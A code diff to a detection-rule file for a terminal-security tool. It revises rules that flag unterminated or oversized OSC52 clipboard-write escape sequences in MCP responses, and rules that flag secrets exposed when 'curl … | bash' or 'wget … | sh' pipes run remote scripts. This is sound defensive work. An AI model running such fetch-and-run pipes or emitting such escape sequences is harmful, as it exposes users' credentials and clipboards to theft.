@@ -1716,13 +1716,13 @@ remediation = "`tirith view` neutralizes the screen-clear in the displayed outpu
 
 [[rule]]
 id = "output_truncated_escape_sequence"
-title = "Escape sequence open at end-of-stream"
+title = "Incomplete or analysis-overflowing escape sequence"
 category = "output"
-severity_rationale = "Medium (High when OSC52) — an OSC or CSI sequence that has not yet been terminated when the input ends is a strong signal that downstream bytes could complete a dangerous sequence (clipboard write, hyperlink, title rewrite). Under fail-closed callers we treat the partial sequence as suspicious so the response can be denied without waiting for terminator bytes that may never arrive."
-description = "Output ended while the byte-scanner was still inside an OSC (`\\e]...`) or CSI (`\\e[...`) sequence. The previous implementation silently dropped this state; we now surface it so MCP gateway / `tirith view` callers can fail-closed."
-examples_bad = ["An MCP response that ends mid-`\\e]52;c;<base64>` (no BEL / no ST) — half of a clipboard-write sequence, completable by the next stream chunk."]
+severity_rationale = "Medium (High when OSC52) — an OSC or CSI sequence that is unterminated, or an OSC payload larger than bounded analysis retention, can still be interpreted by a downstream terminal. Under fail-closed callers we surface the incomplete analysis explicitly; an oversized OSC52 remains a High clipboard-write attempt."
+description = "Output either ended while the byte-scanner was still inside an OSC (`\\e]...`) / CSI (`\\e[...`) sequence, or an OSC exceeded the 16 KiB retention cap. Oversized OSC input stays in discard-until-terminator mode instead of falling back to clean copy-through."
+examples_bad = ["An MCP response that ends mid-`\\e]52;c;<base64>` (no BEL / no ST) — half of a clipboard-write sequence, completable by the next stream chunk.", "An OSC52 clipboard payload larger than 16 KiB that a terminal may accept even though Tirith intentionally stops retaining payload bytes."]
 examples_good = ["A normal log file that ends with a newline or any non-escape byte."]
-false_positive_guidance = "True-positive in practice: well-formed terminal output always terminates its OSC/CSI sequences. A truncated sequence usually means the producer was cut off or the content was tampered with."
+false_positive_guidance = "True-positive in practice: well-formed terminal output terminates its OSC/CSI sequences and keeps control payloads bounded. A truncated or oversized sequence usually means the producer was cut off, hostile, or tampered with."
 remediation = "Under fail-closed mode the wrapping response is replaced with a placeholder. Under fail-open the finding is surfaced as a warning; consult the audit log and re-fetch the source if possible."
 
 # M7 ch5 — prompt-injection seed phrases.
@@ -2262,7 +2262,7 @@ id = "env_sensitive_exposed_to_unknown_script"
 title = "Sensitive env var exposed to an unknown downloaded script"
 category = "environment"
 severity_rationale = "High — when a sensitive environment variable (an AWS key, GitHub/npm/PyPI token, OpenAI/Anthropic/Stripe API key, …) is set in your shell AND you pipe remote content straight into an interpreter (`curl … | bash`), the downloaded script inherits the entire environment and can read and exfiltrate every secret. The combination of a live credential and a sight-unseen script is the canonical supply-chain credential-theft setup."
-description = "`engine::analyze` (with `env_guard_enabled`) found one or more sensitive env vars set while the command pipes a network fetch into a shell. The finding lists the exposed variable NAMES only — never the values. This is the dedicated rule the `--suggest-safe-command` env-scrub rewrite attaches to, suggesting `env -u VAR … <cmd>` to strip the secrets for that one invocation."
+description = "`engine::analyze` (with `env_guard_enabled`) found one or more sensitive env vars set while the command pipes a network fetch into a shell. The finding lists the exposed variable NAMES only — never the values. This is the dedicated rule the `--suggest` env-scrub rewrite attaches to, suggesting `env -u VAR … <cmd>` to strip the secrets for that one invocation."
 examples_bad = ["AWS_SECRET_ACCESS_KEY set, then `curl https://get.example.sh | bash`", "GITHUB_TOKEN exported, then `wget -qO- https://install.example | sh`"]
 examples_good = ["Download to a file, review it, then run it with a scrubbed environment: `env -u AWS_SECRET_ACCESS_KEY bash ./install.sh`"]
 false_positive_guidance = "A trusted vendor install script you have already reviewed will still trip this whenever credentials are in your environment — that is the point. Scrub the secrets for the invocation (`env -u VAR …`) or run the reviewed script from a file rather than a live pipe."
